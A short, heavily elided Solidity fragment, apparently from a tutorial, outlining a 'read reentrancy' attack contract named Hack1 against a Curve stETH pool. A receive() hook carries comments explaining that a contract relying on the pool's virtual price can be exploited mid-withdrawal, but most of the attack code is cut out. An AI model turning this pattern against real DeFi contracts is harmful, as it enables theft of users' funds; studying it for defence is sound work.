...
// Read Reentrancy Attack
contract Hack1 {
  ICurve private constant pool = ICurve(STETH_POOL);
  IERC20 public constant lpToken = IERC20(LP);
  // Value will be assigned at construction time
  ...
  receive() external payable {
    // If we target another contract that depends on virtual price and call that contract while we are removing 
    // liquidity will cause an exploit
  ...
  // Deposit into target by staking tokens
